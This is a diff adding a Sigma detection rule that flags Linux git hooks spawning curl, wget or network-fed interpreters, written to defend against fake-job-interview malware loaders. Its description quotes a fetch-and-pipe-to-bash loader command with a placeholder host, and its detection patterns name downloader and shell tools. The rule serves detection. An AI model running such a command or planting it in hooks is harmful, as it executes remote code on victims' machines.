@@ -1,0 +1,48 @@
+title: Git Hook Spawns Network Downloader or Interpreter (Linux)
+id: 5d2a9b77-61c4-4e0e-8f13-2b8d4c6e1a90
+status: experimental
+description: |
+  Linux counterpart of the macOS rule. Detects git hooks launching curl/wget or an
+  interpreter fed from the network (Contagious Interview git-hook loaders use
+  `wget -qO- http://<ip>:<port>/task/linux?id=<n> | bash`).
+  Analyst-written — validate before production use. Elastic users can instead enable
+  "Git Hook Child Process" (7ce5e1c7-6a49-45e6-a101-0720d185667f) and
+  "Git Hook Egress Network Connection" (9822c5a1-1494-42de-b197-487197bb540c).
+references:
+  - https://citizendot.github.io/articles/fake-job-interview-git-hook-malware/
+  - https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_netcon.toml
+author: cybersec-audit-skill
+date: 2026-11-14
+tags:
+  - attack.execution
+  - attack.t1204.002
+  - attack.t1059.004
+  - attack.t1546
+  - attack.t1105
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  parent_hook:
+    - ParentCommandLine|contains: '/.git/hooks/'
+    - ParentImage|contains: '/.git/hooks/'
+  child_downloader:
+    Image|endswith:
+      - '/curl'
+      - '/wget'
+  child_interpreter:
+    Image|endswith:
+      - '/bash'
+      - '/sh'
+      - '/dash'
+      - '/python3'
+      - '/node'
+  cmd_network:
+    CommandLine|contains:
+      - 'http://'
+      - 'https://'
+      - '/task/'
+  condition: parent_hook and (child_downloader or (child_interpreter and cmd_network))
+falsepositives:
+  - Hooks managed by pre-commit / husky that download linters on first run
+level: high
